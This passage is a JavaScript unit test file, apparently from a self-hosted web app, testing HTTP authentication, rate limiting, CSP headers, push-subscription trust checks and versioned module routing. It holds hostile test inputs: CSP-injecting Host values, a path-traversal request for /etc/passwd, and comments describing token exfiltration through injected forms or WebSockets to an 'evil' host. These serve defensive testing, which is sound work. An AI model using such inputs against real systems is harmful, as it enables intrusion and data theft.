// tests/unit/server-http.test.mjs —— HTTP 层：鉴权、安全头、静态壳的模块路由
// 覆盖：tokenMatches 的常数时间比较（AUTH-01）· 安全响应头 · 鉴权失败计入共享限速（AUTH-03）
//       · /push/subscribe 的第二因子——bypass 级信任必须与信任表等价放行，两条路径不能分叉
//       · /js/** 子模块路由与 import 改写：每个相对 import 都要带版本号，
//         否则浏览器会拿旧缓存的模块拼新代码，症状是「改了没生效」且无任何报错
import assert from 'node:assert/strict';
import { once } from 'node:events';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import express from 'express';
import {
  configureHttpShell,
  createHttpAuth,
  rewriteAppModuleImports,
  rewriteIndexAssetUrls,
  setSecurityHeaders,
  tokenMatches,
  registerOperationalRoutes,
  injectCfAccessFlag,
} from '../../app/src/server/http.js';
import { createCfAccessStrategy } from '../../app/src/auth/auth-strategy.js';

// 鉴权策略桩：刻意复用**真实的** createCfAccessStrategy 而不手写一个对象字面量 ——
// 「从哪个头取 JWT」是 Cloudflare 侧的外部契约，手写桩会把它复制一份，两边就能各自漂移
// 而测试照样绿（本仓在 git fixture 上栽过同型的跟头）。这里只注入验签与 Host 归属两个决策。
const strategyStub = ({ ownsHost = () => false, verify = async () => {}, isEnabled = () => false } = {}) =>
  createCfAccessStrategy({ init: () => true, isEnabled, ownsHost, verify, env: {} });

// 前端拆到 app/public/js/app/* 后，若只给 logic.js 打 ?v=，connection-sync 等子模块会吃浏览器缓存——
// 手机顶栏「延迟」改文案却不生效就是这个坑。与 e2e mock transport 对齐：所有相对 import + css 都戳版本。
test('rewriteAppModuleImports versions every relative ESM import, not only logic.js', () => {
  const src = [
    "import { createRttMonitor } from './app/connection-sync.js';",
    'import { esc } from "./logic.js";',
    "import { x } from '../logic.js';",
    "export const keep = from('./not-an-import.js');", // 非 import 语法不误伤
  ].join('\n');
  const out = rewriteAppModuleImports(src, 'abc12345');
  assert.match(out, /from '\.\/app\/connection-sync\.js\?v=abc12345'/);
  assert.match(out, /from '\.\/logic\.js\?v=abc12345'/);
  assert.match(out, /from '\.\.\/logic\.js\?v=abc12345'/);
  assert.match(out, /from\('\.\/not-an-import\.js'\)/); // 保持原样
});

test('rewriteIndexAssetUrls versions js and css under /js and /css', () => {
  const html = [
    '<script type="module" src="/js/app.js"></script>',
    '<script src="/js/sw-cleanup.js"></script>',
    '<link rel="stylesheet" href="/css/app.css">',
    '<link rel="icon" href="/icons/icon.svg">',
  ].join('\n');
  const out = rewriteIndexAssetUrls(html, 'deadbeef');
  assert.match(out, /\/js\/app\.js\?v=deadbeef/);
  assert.match(out, /\/js\/sw-cleanup\.js\?v=deadbeef/);
  assert.match(out, /\/css\/app\.css\?v=deadbeef/);
  assert.match(out, /\/icons\/icon\.svg"/); // 图标不进 assetVersion 链
  // 已带 ?v= 的不重复追加
  assert.equal(
    rewriteIndexAssetUrls('/js/app.js?v=old', 'new'),
    '/js/app.js?v=old',
  );
});

// vendor/ 下的库文件被静态服务那端打了 immutable, max-age=31536000（一年）——?v= 是它们唯一的
// 失效手段，此前 rewriteIndexAssetUrls 的正则不认 /vendor/ 前缀，这批文件的引用点从未被戳过版本号。
test('rewriteIndexAssetUrls 同样覆盖 /vendor/（含嵌套子目录），这批文件被 immutable 缓存一年，?v= 是唯一失效手段', () => {
  const html = [
    '<script src="/vendor/purify.min.js"></script>',
    '<link rel="stylesheet" href="/vendor/github-light.min.css">',
    '<script src="/vendor/codemirror/mode-javascript.min.js"></script>', // 嵌套子目录
  ].join('\n');
  const out = rewriteIndexAssetUrls(html, 'deadbeef');
  assert.match(out, /\/vendor\/purify\.min\.js\?v=deadbeef/);
  assert.match(out, /\/vendor\/github-light\.min\.css\?v=deadbeef/);
  assert.match(out, /\/vendor\/codemirror\/mode-javascript\.min\.js\?v=deadbeef/);
});

test('tokenMatches compares exact byte sequences and rejects missing configuration', () => {
  assert.equal(tokenMatches('', 'anything'), false);
  assert.equal(tokenMatches('secret', undefined), false);
  assert.equal(tokenMatches('secret', 'secret'), true);
  assert.equal(tokenMatches('secret', 'Secret'), false);
  assert.equal(tokenMatches('密钥', '密钥'), true);
  assert.equal(tokenMatches('密钥', '密钥x'), false);
});

test('setSecurityHeaders applies the browser security boundary', () => {
  const headers = new Map();
  setSecurityHeaders({ setHeader: (name, value) => headers.set(name, value) });

  assert.match(headers.get('Content-Security-Policy'), /frame-ancestors 'none'/);
  assert.equal(headers.get('X-Frame-Options'), 'DENY');
  assert.equal(headers.get('X-Content-Type-Options'), 'nosniff');
  assert.equal(headers.get('Referrer-Policy'), 'no-referrer');
});

// SEC：form-action 与 base-uri 都【不】回落到 default-src（CSP 规范），不显式声明就是完全无限制。
// 渲染的 LLM 正文经 DOMPurify 后仍可能带 <form action="https://evil/">：script-src 拦不住表单导航、
// connect-src 也拦不住，用户被诱导填进去的 AUTH_TOKEN 会被 POST 到外域。
test('setSecurityHeaders pins form-action and base-uri so injected markup cannot exfiltrate', () => {
  const headers = new Map();
  setSecurityHeaders({ setHeader: (name, value) => headers.set(name, value) });
  const csp = headers.get('Content-Security-Policy');

  assert.match(csp, /form-action 'self'/);
  assert.match(csp, /base-uri 'none'/);
});

// L2（2026-09-17 安全审查）：connect-src 原本是 `'self' ws: wss:`。裸的 scheme 不限主机——
// 只要 CSP 的 script 那一层被突破一次（目前 script-src 'self' 很紧，但这正是纵深要防的那一格），
// 注入的脚本就能 `new WebSocket('wss://evil/')` 把会话内容整段外带，而 connect-src 不拦。
//
// 【为什么按本页 Host 列出来，而不是只写 'self'】CSP3 规范里 'self' 应当覆盖同源的 ws/wss，
// 但 Safari 在这一格上历史有坑，而 iOS PWA 是本产品的主要目标之一 —— 判错的后果是 socket
// 连不上、整个 app 在 iOS 上不可用。显式列出同源的 ws:// 与 wss:// 不依赖那条规范细节，
// 收紧程度完全一样（列的就是本页自己的源）。
test.describe('setSecurityHeaders: connect-src 收紧到同源（L2）', () => {
  const cspFor = (host) => {
    const headers = new Map();
    setSecurityHeaders({ setHeader: (n, v) => headers.set(n, v) }, host);
    return headers.get('Content-Security-Policy');
  };

  test('带 Host 时列出同源的 ws/wss，且不留裸 scheme', () => {
    const csp = cspFor('ccm.example.com');
    assert.match(csp, /connect-src 'self' ws:\/\/ccm\.example\.com wss:\/\/ccm\.example\.com/);
    // ★ 这条是本次改动的全部意义所在：裸 `ws:` / `wss:` 不限主机
    assert.doesNotMatch(csp, /connect-src[^;]*\sws:\s/, '不得留下不限主机的裸 ws:');
    assert.doesNotMatch(csp, /connect-src[^;]*\swss:\s/, '不得留下不限主机的裸 wss:');
  });

  test('带端口的 Host 原样保留（局域网走 http://ip:3000，端口是源的一部分）', () => {
    assert.match(cspFor('192.168.1.9:3000'),
      /connect-src 'self' ws:\/\/192\.168\.1\.9:3000 wss:\/\/192\.168\.1\.9:3000/);
  });

  // 没有 Host 头就没有「同源」可列。回落到 'self' 而不是回落到裸 scheme：
  // 失败方向是更严，不是更松。
  test('没有 Host 时只留 self（失败方向是更严）', () => {
    for (const h of [undefined, null, '']) {
      const csp = cspFor(h);
      assert.match(csp, /connect-src 'self'(;|$)/);
      assert.doesNotMatch(csp, /ws:/, '取不到 Host 时不得回落成裸 scheme');
    }
  });

  // Host 是客户端可控的。值里带分号/空格/引号就能往 CSP 里塞别的指令——只害到他自己那一个
  // 响应，但没有理由让一个畸形输入改写策略结构。形状不对就当没有。
  test('畸形 Host 不得注入 CSP 指令，按「没有 Host」处理', () => {
    for (const bad of ['evil; script-src *', 'a b', 'has"quote', 'has\'quote', '../x']) {
      const csp = cspFor(bad);
      assert.match(csp, /connect-src 'self'(;|$)/, `${JSON.stringify(bad)} 应被当成没有 Host`);
      assert.doesNotMatch(csp, /script-src \*/, 'CSP 指令被注入了');
    }
  });

  test('其余指令不受影响（改一处不该动到别处）', () => {
    const csp = cspFor('ccm.example.com');
    for (const d of [/default-src 'self'/, /script-src 'self'/, /frame-ancestors 'none'/,
      /form-action 'self'/, /base-uri 'none'/, /img-src 'self' data:/]) {
      assert.match(csp, d);
    }
  });
});

test('createHttpAuth uses Access JWT for public hosts and token fallback for local requests', async () => {
  const verified = [];
  const auth = createHttpAuth({
    authToken: 'secret',
    strategy: strategyStub({
      ownsHost: host => host === 'public.example',
      verify: async token => verified.push(token),
    }),
  });

  const run = async req => {
    const response = { statusCode: 200, body: null, headers: new Map() };
    const res = {
      status(code) { response.statusCode = code; return this; },
      json(body) { response.body = body; return this; },
      setHeader(k, v) { response.headers.set(k, v); return this; },
    };
    let nextCalled = false;
    await auth(req, res, () => { nextCalled = true; });
    return { ...response, nextCalled };
  };

  assert.equal((await run({ headers: { host: 'localhost', 'x-auth-token': 'secret' }, query: {} })).nextCalled, true);
  assert.equal((await run({ headers: { host: 'localhost' }, query: {} })).statusCode, 401);
  assert.equal((await run({ headers: { host: 'public.example', 'cf-access-jwt-assertion': 'jwt' }, query: { token: 'secret' } })).nextCalled, true);
  assert.deepEqual(verified, ['jwt']);
});

// AUTH-03：HTTP 鉴权失败计入共享限速，达阈值 → 429
test('createHttpAuth rateLimit：连续失败锁定 → 429（AUTH-03）', async () => {
  const states = new Map();
  let locked = 0;
  let now = 1_000_000;
  const { onAuthResult } = await import('../../app/src/auth/rate-limiter.js');
  const auth = createHttpAuth({
    authToken: 'secret',
    strategy: strategyStub(),
    rateLimit: {
      active: true,
      sourceKey: () => 'ip:9.9.9.9',
      getState: (k) => states.get(k),
      setState: (k, st) => { states.set(k, st); },
      onResult: onAuthResult,
      now: () => now,
      onLocked: () => { locked++; },
    },
  });
  const run = async () => {
    const response = { statusCode: 200, body: null, headers: new Map() };
    const res = {
      status(code) { response.statusCode = code; return this; },
      json(body) { response.body = body; return this; },
      setHeader(k, v) { response.headers.set(k, v); return this; },
    };
    let nextCalled = false;
    await auth({ headers: { host: 'lan' }, query: {}, socket: { remoteAddress: '9.9.9.9' } }, res, () => { nextCalled = true; });
    return { ...response, nextCalled };
  };
  // threshold=8：每次失败后跳过 backoff 再试
  for (let i = 0; i < 8; i++) {
    const r = await run();
    assert.equal(r.nextCalled, false);
    // 前 7 次 401，第 8 次 locked → 429
    if (i < 7) {
      assert.equal(r.statusCode, 401, `fail ${i + 1} → 401`);
      const st = states.get('ip:9.9.9.9');
      now = (st?.lockUntil || now) + 1;
    } else {
      assert.equal(r.statusCode, 429, '第 8 次失败应 429 rate_limited');
      assert.equal(r.body?.status, 'rate_limited');
    }
  }
  assert.equal(locked, 1);
});

// 验收 O83（AC-22-09）：退避冷却期内的请求根本没校验令牌。此前一律回 401 unauthorized——带着正确令牌的请求也被
// 告知「令牌不对」，客户端分不出是令牌失效还是被退避（E2 实测窗口 524–544ms）。现在回 429 + Retry-After，status 用
// cooldown 与长锁的 rate_limited 区分：「尝试过多」只属于长锁（2026-09-02 只错一次就被告知尝试过多的误报，见
// rate-limiter.js gateCheck）。HTTP 侧与 socket 握手共用同一个限速桶，本机脚本用错令牌打一次 /health 就会把
// 浏览器的握手一起拖进这把短锁。
test('createHttpAuth：退避冷却期内 → 429 cooldown + Retry-After，带正确令牌也一样，且不计数', async () => {
  const states = new Map();
  let now = 1_000_000;
  const { onAuthResult } = await import('../../app/src/auth/rate-limiter.js');
  const mkAuth = () => createHttpAuth({
    authToken: 'secret',
    strategy: strategyStub(),
    rateLimit: {
      active: true,
      sourceKey: () => 'ip:127.0.0.1',
      getState: (k) => states.get(k),
      setState: (k, st) => { states.set(k, st); },
      onResult: onAuthResult,
      now: () => now,
    },
  });
  const run = async (query) => {
    const response = { statusCode: 200, body: null, headers: new Map(), passed: false };
    const res = {
      status(code) { response.statusCode = code; return this; },
      json(body) { response.body = body; return this; },
      setHeader(k, v) { response.headers.set(k, v); return this; },
    };
    await mkAuth()({ headers: { host: 'localhost' }, query, socket: { remoteAddress: '127.0.0.1' } }, res, () => { response.passed = true; });
    return response;
  };
  const first = await run({ token: 'wrong' });     // 失败 #1：真校验了令牌 → 401 + 上 500ms 退避锁
  assert.equal(first.statusCode, 401);
  assert.equal(first.body?.status, 'unauthorized');
  assert.equal(first.headers.get('Retry-After'), undefined, '令牌真错时不带 Retry-After');
  now += 235;                                      // 生产实测的 235ms（pageshow → 200ms 重连）
  const second = await run({ token: 'secret' });   // 正确令牌撞进退避锁：没校验
  assert.equal(second.passed, false);
  assert.equal(second.statusCode, 429, '冷却期内带正确令牌也不能说成「令牌不对」');
  assert.equal(second.body?.status, 'cooldown', '与长锁的 rate_limited 分开，客户端才不会说成「尝试过多」');
  assert.equal(second.headers.get('Retry-After'), '1');
  assert.equal(states.get('ip:127.0.0.1').failCount, 1, '冷却期内不计数');
  const bare = await run({});                       // 冷却期内压根没带令牌：不校验也知道没授权
  assert.equal(bare.statusCode, 401, '没带令牌说「请输入令牌」是真话，回 cooldown 会让前端拿空令牌自动重试');
  assert.equal(bare.body?.status, 'unauthorized');
  assert.equal(bare.headers.get('Retry-After'), undefined);
  assert.equal((await run({ token: '' })).statusCode, 401, '空令牌与没带同等对待');
  now += 300;                                      // 过了 500ms 退避
  const third = await run({ token: 'secret' });
  assert.equal(third.passed, true, '冷却过后正确令牌照常放行');
});

// 2026-09-02：HTTP 侧此前只在「达阈值锁定」那一刻打一行日志，逐次失败连打的哪个端点都不记。
// 审计里那条 `ip:127.0.0.1 锁 900s（via:http）`，前后 10 分钟日志全空白——事后完全无法归因
// 是谁在打。socket 侧每次失败都有 [conn] 日志，两侧不对称。
test('createHttpAuth：每次鉴权失败都经 onAuthFailure 上报，且绝不带出令牌值', async () => {
  const seen = [];
  const auth = createHttpAuth({
    authToken: 'secret',
    strategy: strategyStub(),
    onAuthFailure: (info) => seen.push(info),
  });
  const res = { status() { return this; }, json() { return this; }, setHeader() { return this; } };
  await auth({ headers: { host: 'localhost' }, query: { token: 'wrong-token-value' }, path: '/health' }, res, () => {});
  await auth({ headers: { host: 'localhost' }, query: {}, path: '/metrics' }, res, () => {});

  assert.equal(seen.length, 2, '两次失败都要能被看见');
  assert.equal(seen[0].path, '/health');
  assert.equal(seen[0].reason, 'bad_token', '带了令牌但不匹配');
  assert.equal(seen[1].path, '/metrics');
  assert.equal(seen[1].reason, 'no_token', '压根没带令牌——与「带错了」是不同的排查方向');
  const dumped = JSON.stringify(seen);
  assert.doesNotMatch(dumped, /wrong-token-value|secret/, '日志载荷里不得出现任何令牌值');
});

// 2026-08-06 R6：try 不得把 next() 圈进去。下游 handler（/metrics 聚合、/push/subscribe 解析等）
// 的同步抛错不是鉴权失败——圈进 catch 会给【已通过鉴权】的来源计一次失败（连续 8 次即 15min 锁定，
// 用户被自家某个 handler 的 bug 锁在门外），且在响应可能已写出后二次 res.status(401)。
test('createHttpAuth：下游 handler 抛错不计鉴权失败、不二次写响应、异常向外传播', async () => {
  const states = new Map();
  const onResultCalls = [];
  let now = 3_000_000;
  const { onAuthResult } = await import('../../app/src/auth/rate-limiter.js');
  const auth = createHttpAuth({
    authToken: 'secret',
    strategy: strategyStub(),
    rateLimit: {
      active: true,
      sourceKey: () => 'ip:7.7.7.7',
      getState: (k) => states.get(k),
      setState: (k, st) => { states.set(k, st); },
      onResult: (st, ok, ts) => { onResultCalls.push(ok); return onAuthResult(st, ok, ts); },
      now: () => now,
    },
  });
  const statusCalls = [];
  const res = {
    status(code) { statusCalls.push(code); return this; },
    json() { return this; },
    setHeader() { return this; },
  };
  const req = { headers: { host: 'lan' }, query: { token: 'secret' }, socket: { remoteAddress: '7.7.7.7' } };
  // 下游同步抛错必须向外传播（交给 Express 错误处理），而不是被当鉴权失败吞掉
  await assert.rejects(
    auth(req, res, () => { throw new Error('downstream boom'); }),
    /downstream boom/,
  );
  assert.deepEqual(onResultCalls, [true], '只该有鉴权成功那一次计数，绝不能出现 ok=false');
  assert.equal((states.get('ip:7.7.7.7')?.failCount ?? 0), 0, '失败计数必须为 0——否则 8 个下游 bug 就把用户锁 15 分钟');
  assert.deepEqual(statusCalls, [], '下游抛错后不得二次写响应（401/429 都不行）');
});

// AUTH-NEW-1：active 可为 (req)=>boolean；无 AUTH_TOKEN 但公网 Host 仍须对 JWT 失败限速
test('createHttpAuth rateLimit：active(req) 公网 Host 无 token 仍计入失败（AUTH-NEW-1）', async () => {
  const states = new Map();
  let now = 2_000_000;
  const { onAuthResult } = await import('../../app/src/auth/rate-limiter.js');
  const auth = createHttpAuth({
    authToken: '', // 无 AUTH_TOKEN
    strategy: strategyStub({
      ownsHost: (h) => h === 'app.example.com',
      verify: async () => { throw new Error('bad jwt'); },
    }),
    rateLimit: {
      active: (req) => !!(req?.headers?.host === 'app.example.com'),
      sourceKey: () => 'ip:cf',
      getState: (k) => states.get(k),
      setState: (k, st) => { states.set(k, st); },
      onResult: onAuthResult,
      now: () => now,
    },
  });
  const run = async () => {
    const response = { statusCode: 200, body: null, headers: new Map() };
    const res = {
      status(code) { response.statusCode = code; return this; },
      json(body) { response.body = body; return this; },
      setHeader(k, v) { response.headers.set(k, v); return this; },
    };
    await auth({ headers: { host: 'app.example.com' }, query: {}, socket: {} }, res, () => {});
    return response;
  };
  for (let i = 0; i < 8; i++) {
    const r = await run();
    if (i < 7) {
      assert.equal(r.statusCode, 401, `public JWT fail ${i + 1} → 401`);
      const st = states.get('ip:cf');
      now = (st?.lockUntil || now) + 1;
    } else {
      assert.equal(r.statusCode, 429, '公网无 AUTH_TOKEN 第 8 次 JWT 失败应 429');
    }
  }
  // 本机 Host + active(req)=false 不应累加同一桶
  states.clear();
  now = 3_000_000;
  const lanRes = { statusCode: 200, body: null, headers: new Map(),
    status(c) { this.statusCode = c; return this; },
    json(b) { this.body = b; return this; },
    setHeader() { return this; },
  };
  // active 对 lan host 为 false → 不限速；无 token 本机放行
  await auth({ headers: { host: '127.0.0.1' }, query: {}, socket: {} }, lanRes, () => {});
  assert.equal(states.size, 0, '非公网且 active(req)=false 不写限速状态');
});

// A1 的「仅已批准设备可登记推送」在 bypass 拓扑下是 fail-closed 用错了地方：socket 侧 io.use 对
// 「CF Access 已验」与「真本机直连」走 bypass 分支，而那条分支【不调 addPendingDevice】——这类设备
// 结构上永远进不了待审列表；approveDevice 的三个入口又都要求先在待审列表里，用户在 UI/CLI 上看不到它、
// 无从批准。于是只从公网装 PWA 的手机（deployment.md 主推拓扑）POST /push/subscribe 恒 403，
// 前端只把 'HTTP 403' 写进日志、按钮无提示 —— 推送在旗舰拓扑下静默失效。
test.describe('/push/subscribe 的第二因子：bypass 级信任必须与信任表等价放行', () => {
  function mount({ isDeviceTrusted, bypassDeviceApproval }) {
    const routes = new Map();
    const app = {
      get: (p, ...h) => routes.set(`GET ${p}`, h),
      post: (p, ...h) => routes.set(`POST ${p}`, h),
    };
    const saved = [];
    registerOperationalRoutes({
      app,
      httpAuth: (_req, _res, next) => next(),
      getHealth: () => ({}),
      getMetrics: () => ({}),
      push: {
        enabled: true,
        publicKey: 'k',
        isValidSubscription: () => true,
        saveSubscription: sub => saved.push(sub),
      },
      isDeviceTrusted,
      bypassDeviceApproval,
    });
    const handlers = routes.get('POST /push/subscribe');
    const run = () => {
      const req = {
        body: { endpoint: 'https://push.example/a', keys: { p256dh: 'a', auth: 'b' } },
        get: () => '',
        headers: {},
      };
      const out = { status: 200, payload: null };
      const res = {
        status(c) { out.status = c; return this; },
        json(p) { out.payload = p; return this; },
      };
      handlers[handlers.length - 1](req, res);
      return out;
    };
    return { run, saved };
  }

  test('CF Access / 本机直连（bypass=true）即使不在信任表里也能订阅', () => {
    const { run, saved } = mount({ isDeviceTrusted: () => false, bypassDeviceApproval: () => true });
    const out = run();
    assert.equal(out.status, 200, `不应 403，实际 ${out.status} ${JSON.stringify(out.payload)}`);
    assert.equal(saved.length, 1, '订阅必须落盘');
  });

  test('既不在信任表、也不是 bypass → 仍然 403（第二因子不被削弱）', () => {
    const { run, saved } = mount({ isDeviceTrusted: () => false, bypassDeviceApproval: () => false });
    const out = run();
    assert.equal(out.status, 403);
    assert.equal(saved.length, 0);
  });

  test('在信任表里 → 照常放行（原有行为不变）', () => {
    const { run, saved } = mount({ isDeviceTrusted: () => true, bypassDeviceApproval: () => false });
    assert.equal(run().status, 200);
    assert.equal(saved.length, 1);
  });
});

// 退订是「从收件人名单里移除自己」。此前压根没有这条路由：订上之后服务端那条 endpoint 只能等
// 下一次推送收 410 才被动清掉，而浏览器侧一旦 unsubscribe()，那次推送根本不会再发生 —— 残留可以
// 永久留在 push-subscription.json 里。
// 第二因子与 /push/subscribe 【同门】：同一份名单的增与删走同一道判据。只删 body 里点名的那条
// endpoint，绝不清空全表 —— 手机退订不该顺手把 iPad 的订阅也掐了。
test.describe('/push/unsubscribe：退订必须真的能退', () => {
  function mount({ isDeviceTrusted = () => true, bypassDeviceApproval = () => false, enabled = true } = {}) {
    const routes = new Map();
    const app = {
      get: (p, ...h) => routes.set(`GET ${p}`, h),
      post: (p, ...h) => routes.set(`POST ${p}`, h),
    };
    const removed = [];
    registerOperationalRoutes({
      app,
      httpAuth: (_req, _res, next) => next(),
      getHealth: () => ({}),
      getMetrics: () => ({}),
      push: {
        enabled,
        publicKey: 'k',
        isValidSubscription: () => true,
        saveSubscription: () => {},
        removeSubscription: endpoint => { removed.push(endpoint); return true; },
      },
      isDeviceTrusted,
      bypassDeviceApproval,
    });
    const handlers = routes.get('POST /push/unsubscribe');
    const run = (body = { endpoint: 'https://push.example/a' }) => {
      const req = { body, get: () => '', headers: {} };
      const out = { status: 200, payload: null };
      const res = {
        status(c) { out.status = c; return this; },
        json(p) { out.payload = p; return this; },
      };
      handlers[handlers.length - 1](req, res);
      return out;
    };
    return { run, removed, mounted: !!handlers };
  }

  test('受信设备带 endpoint → 200，且服务端真的把那条删了', () => {
    const { run, removed, mounted } = mount();
    assert.ok(mounted, '路由必须挂上，否则前端退订永远 404');
    const out = run();
    assert.equal(out.status, 200, `实际 ${out.status} ${JSON.stringify(out.payload)}`);
    assert.deepEqual(removed, ['https://push.example/a']);
  });

  test('既不在信任表、也不是 bypass → 403（增删同门，不因为是「降权操作」就松一道）', () => {
    const { run, removed } = mount({ isDeviceTrusted: () => false, bypassDeviceApproval: () => false });
    assert.equal(run().status, 403);
    assert.deepEqual(removed, []);
  });

  test('没给 endpoint → 400，不得当成「清空全部」', () => {
    const { run, removed } = mount();
    assert.equal(run({}).status, 400);
    assert.deepEqual(removed, []);
  });
});

// /js/** 子模块路由：源码在启动时读完并做完 ?v= 改写，请求期只查表。
// 每请求 readFileSync 是同步阻塞事件循环的磁盘访问，而这条路由在鉴权之前（静态资源必须登录前可取），
// 与同文件里 indexHtml/appJs 的启动预读也不一致。「改了 js 要重启」不是新约束——assetVersion 本就是
// 启动时哈希算的，不重启 ?v= 也不换。
test.describe('configureHttpShell 的 /js/** 子模块路由', () => {
  const roots = [];
  test.after(() => { for (const dir of roots) rmSync(dir, { recursive: true, force: true }); });

  function mount(options = {}) {
    const root = mkdtempSync(join(tmpdir(), 'ccm-http-shell-'));
    roots.push(root);
    mkdirSync(join(root, 'app/public/js/app'), { recursive: true });
    writeFileSync(join(root, 'app/public/index.html'), '<body ><script src="/js/app.js"></script></body>');
    writeFileSync(join(root, 'app/public/js/app.js'), "import './app/sub.js';\n");
    writeFileSync(
      join(root, 'app/public/js/app/sub.js'),
      "import { esc } from '../logic.js';\nexport const BUILD = 'startup';\n",
    );

    const routes = new Map();
    const disabled = [];
    const app = { use: () => {}, get: (p, ...h) => routes.set(String(p), h), disable: (k) => disabled.push(k) };
    configureHttpShell({ app, projectRoot: root, strategy: strategyStub(), ...options });

    const handlers = routes.get(String(/^\/js\/.+\.js$/i));
    assert.ok(handlers, '未注册 /js/** 子模块路由');
    const run = path => {
      const out = { status: 200, body: null, headers: new Map(), nextCalled: false };
      const res = {
        status(c) { out.status = c; return this; },
        setHeader(k, v) { out.headers.set(k, v); return this; },
        type() { return this; },
        send(b) { out.body = b; return this; },
        end() { return this; },
      };
      handlers[handlers.length - 1]({ path }, res, () => { out.nextCalled = true; });
      return out;
    };
    // 按注册键直接打某条专用路由（/js/app.js、index）——run() 只走 /js/** 那条正则路由。
    const invoke = (routeKey, path) => {
      const hs = routes.get(routeKey);
      assert.ok(hs, `未注册路由 ${routeKey}`);
      const out = { status: 200, body: null, headers: new Map(), nextCalled: false };
      const res = {
        status(c) { out.status = c; return this; },
        setHeader(k, v) { out.headers.set(k, v); return this; },
        type() { return this; },
        send(b) { out.body = b; return this; },
        end() { return this; },
      };
      hs[hs.length - 1]({ path }, res, () => { out.nextCalled = true; });
      return out;
    };
    return { root, run, invoke, disabled };
  }

  // 生产档显式传 hotReloadJs:false —— 默认值读的是 process.env.ASSET_HOT_RELOAD，
  // 让断言依赖跑测试那台机器的环境变量，就是在制造只有某些机器才红的用例。
  test('请求期零磁盘访问：启动后改盘，路由仍发启动时那份（且相对 import 已戳版本）', () => {
    const { root, run } = mount({ hotReloadJs: false });
    writeFileSync(join(root, 'app/public/js/app/sub.js'), "export const BUILD = 'mutated-after-boot';\n");

    const out = run('/js/app/sub.js');
    assert.equal(out.status, 200);
    assert.match(out.body, /BUILD = 'startup'/);
    assert.doesNotMatch(out.body, /mutated-after-boot/, '请求期又去读盘了');
    assert.match(out.body, /from '\.\.\/logic\.js\?v=[0-9a-f]{8}'/);
    assert.equal(out.headers.get('Cache-Control'), 'no-cache');
  });

  // 查表用的 key 与请求路径必须同一套大小写规则：请求路径 .toLowerCase() 是为了
  // CodeQL js/case-sensitive-middleware-path，建表那侧此前没做同样的归一——只改请求侧是半边，
  // 混大小写文件名会查表 miss → 落到 static 原样发出（相对 import 不戳 ?v=）且零提示。
  test('混大小写文件名仍能命中（建表 key 与请求路径同一套大小写归一）', () => {
    const root2 = mkdtempSync(join(tmpdir(), 'ccm-http-shell-'));
    roots.push(root2);
    mkdirSync(join(root2, 'app/public/js/app'), { recursive: true });
    writeFileSync(join(root2, 'app/public/index.html'), '<body><script src="/js/app.js"></script></body>');
    writeFileSync(join(root2, 'app/public/js/app.js'), "import './app/CamelCase.js';\n");
    writeFileSync(join(root2, 'app/public/js/app/CamelCase.js'), "export const BUILD = 'mixed-case';\n");

    const routes = new Map();
    const app = { use: () => {}, get: (p, ...h) => routes.set(String(p), h), disable: () => {} };
    configureHttpShell({ app, projectRoot: root2, strategy: strategyStub(), hotReloadJs: false });
    const handlers = routes.get(String(/^\/js\/.+\.js$/i));
    const res = { status() { return this; }, setHeader() { return this; }, type() { return this; }, send(b) { this.body = b; return this; }, end() {} };
    let nextCalled = false;
    handlers[handlers.length - 1]({ path: '/js/app/CamelCase.js' }, res, () => { nextCalled = true; });
    assert.equal(nextCalled, false, '不该落到 static——查表应该命中');
    assert.match(res.body, /mixed-case/);
  });

  test('路径穿越照旧 400（显式防线不因查表而失效）', () => {
    const out = mount().run('/js/../../etc/passwd.js');
    assert.equal(out.status, 400);
    assert.equal(out.nextCalled, false);
  });

  test('表里没有的子模块交给 static 去 404', () => {
    const out = mount().run('/js/never-existed.js');
    assert.equal(out.nextCalled, true);
    assert.equal(out.body, null);
  });

  test('/js/app.js 让给上面的专用路由', () => {
    assert.equal(mount().run('/js/app.js').nextCalled, true);
  });

  // CodeQL js/case-sensitive-middleware-path：Express 字符串路径默认大小写不敏感，
  // 正则默认敏感。不带 i 时 /JS/app/sub.js 绕过改写落到 static，在大小写不敏感的
  // 文件系统上发出未戳 ?v= 的源码（模块双实例）。
  test('大小写折叠的 /JS/**.js 仍走改写路由，不落到 static', () => {
    const { run } = mount({ hotReloadJs: false });
    for (const path of ['/JS/app/sub.js', '/js/APP/SUB.JS', '/Js/App/Sub.JS']) {
      const out = run(path);
      assert.equal(out.nextCalled, false, `${path} 落到了 static`);
      assert.equal(out.status, 200, path);
      assert.match(out.body, /BUILD = 'startup'/);
      assert.match(out.body, /from '\.\.\/logic\.js\?v=[0-9a-f]{8}'/);
    }
  });

  test('大小写折叠的 /JS/APP.JS 仍让给专用路由', () => {
    assert.equal(mount().run('/JS/APP.JS').nextCalled, true);
  });

  // ★ 2026-08-04 code review：ASSET_HOT_RELOAD=1 只接了 /js/** 子模块那条路由，
  // /js/app.js（约 7000 行、前端改动的主要落点）与 index.html 仍发启动时那份 —— 开发者按
  // .env.example 打开开关、改 app.js、刷新，拿到的是旧代码；而唯一会提示「改前端需重启」的
  // 启动横幅恰恰关在 if (!hotReloadJs) 里，热读模式下什么都不打印，没有任何线索能解释陈旧。
  test('hotReloadJs：/js/app.js 也必须热读（它是前端改动的主要落点）', () => {
    const { root, invoke } = mount({ hotReloadJs: true });
    writeFileSync(join(root, 'app/public/js/app.js'), "import { BUILD } from './app/sub.js';\nexport const MAIN = 'edited-after-boot';\n");
    const out = invoke('/js/app.js', '/js/app.js');
    assert.equal(out.status, 200);
    assert.match(out.body, /edited-after-boot/, '开着热读却发启动快照 = 开关名不副实');
    assert.match(out.body, /from '\.\/app\/sub\.js\?v=[0-9a-f]{8}'/, '热读路径同样要戳版本');
  });

  test('hotReloadJs：index.html 也热读', () => {
    const { root, invoke } = mount({ hotReloadJs: true });
    writeFileSync(join(root, 'app/public/index.html'), '<body ><!--edited-after-boot--><script src="/js/app.js"></script></body>');
    const out = invoke('/,/index.html', '/');
    assert.match(out.body, /edited-after-boot/);
  });

  test('生产档（hotReloadJs:false）仍是启动快照，不因热读改造回退成逐请求读盘', () => {
    const { root, invoke } = mount({ hotReloadJs: false });
    writeFileSync(join(root, 'app/public/js/app.js'), "export const MAIN = 'mutated-after-boot';\n");
    const out = invoke('/js/app.js', '/js/app.js');
    assert.doesNotMatch(out.body, /mutated-after-boot/, '生产档请求期不该读盘');
  });

  // 开发期必须能改完就刷新看到。启动预读是 2026-08-02 为"请求期零磁盘访问"加的，但它把
